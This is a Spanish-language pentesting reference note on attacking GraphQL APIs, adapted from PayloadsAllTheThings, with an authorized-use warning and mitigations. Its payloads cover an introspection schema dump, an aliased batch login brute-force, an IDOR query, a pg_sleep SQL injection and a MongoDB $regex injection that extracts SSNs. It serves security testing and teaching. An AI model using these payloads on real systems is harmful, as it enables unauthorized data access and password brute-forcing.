---
tags:
  - seguridad-web
  - owasp
  - graphql
aliases:
  - GraphQL (ataques)
  - GraphQL Injection
---

# GraphQL (ataques)

**GraphQL es un lenguaje de consulta para APIs que expone un único endpoint y un esquema tipado.** Una configuración insegura permite enumerar todo el esquema, abusar del batching para esquivar límites y, como es solo una capa sobre la base de datos, encadenar inyecciones SQL/NoSQL e IDOR.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
El cliente envía consultas (`query`), mutaciones (`mutation`) o suscripciones a un endpoint único (normalmente `/graphql`). El servidor publica un **esquema** con tipos, campos y relaciones. Como GraphQL es solo una capa entre el cliente y los datos, la entrada que llega a los *resolvers* puede alcanzar consultas a base de datos, y los controles de acceso por campo suelen ser inconsistentes.

## Detección y pruebas
- Sondea rutas comunes: `/graphql`, `/graphiql`, `/graphql.php`, `/graph`, `/v1/graphql`, `/graphql/console`.
- El servidor acepta **POST** (JSON con clave `query`) y a veces **GET** (`?query={...}`).
- Comprueba si los errores son visibles enviando consultas inválidas: `?query={__schema}`, `?query={thisdefinitelydoesnotexist}`.
- Identifica el motor (graphw00f) y audita la configuración (graphql-cop).

## Explotación / payloads

### Introspección (volcado del esquema)
Los campos especiales `__schema` y `__type` permiten preguntar al servidor qué tipos y campos existen. Si la introspección está habilitada, vuelca el esquema completo:

```js
{ "query": "{ __schema { types { name } } }" }
```

Enumera un tipo concreto y sus campos:

```js
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

Si la introspección está deshabilitada, usa **sugerencias** ("Did you mean ...?") o fuerza nombres con diccionario (clairvoyance, graphql-wordlist). Con el JSON de introspección, `graphql-path-enum` lista las rutas para llegar a un tipo objetivo (p.ej. `User` → `PentesterProfile` → `Skill`).

### Batching (bypass de rate limit / fuerza bruta / 2FA)
Una sola petición HTTP ejecuta muchas operaciones, amplificando fuerza bruta y esquivando límites por petición. Lista JSON de consultas o **alias** sobre la misma mutación:

```js
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third:  login(pass: 3333, username: "bob")
}
```

### IDOR / control de acceso
Los argumentos de campo (`id`, filtros) son puntos clásicos de acceso roto. Cambia el `id` o explora relaciones anidadas para alcanzar datos ajenos:

```js
{ user(id: "1") { name email posts { title comments { content } } } }
```

### SQLi / NoSQLi vía GraphQL
La entrada de un argumento llega a la consulta del backend. Una comilla simple dispara SQLi:

```js
{ user(name: "patt';SELECT pg_sleep(30);--'") { id email } }
```

NoSQLi inyectando operadores Mongo (`$regex`) en un parámetro de búsqueda:

```js
{ doctors(search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }") { id patients { ssn } } }
```

## Mitigación
- **Deshabilitar la introspección** y las sugerencias de campo en producción.
- Aplicar **autorización por campo/resolver** y validar la propiedad de cada objeto (evita IDOR).
- Limitar **profundidad y complejidad** de consultas; deshabilitar o limitar el batching (límite de operaciones/alias por petición).
- Tratar los argumentos como entrada no confiable: consultas parametrizadas y forzado de tipos (mitiga SQLi/NoSQLi).
- Rate limiting real (no solo por petición HTTP) y mensajes de error genéricos.

## Herramientas
- **GraphQLmap** — motor de scripting para pentesting de endpoints GraphQL.
- **InQL** / **GQLSpection** — extensión de Burp y generación de consultas desde la introspección.
- **graphw00f** / **graphql-cop** — fingerprinting y auditoría de seguridad.
- **clairvoyance** — recupera el esquema con la introspección deshabilitada.
- **graphql-path-enum** — rutas hacia un tipo objetivo.

---
🔗 Relacionado: [[IDOR]] · [[Inyección SQL (SQLi)]] · [[Inyección NoSQL]] · [[Fugas de API keys]]
📚 Fuente: [PayloadsAllTheThings — GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection) (MIT, © Swissky)
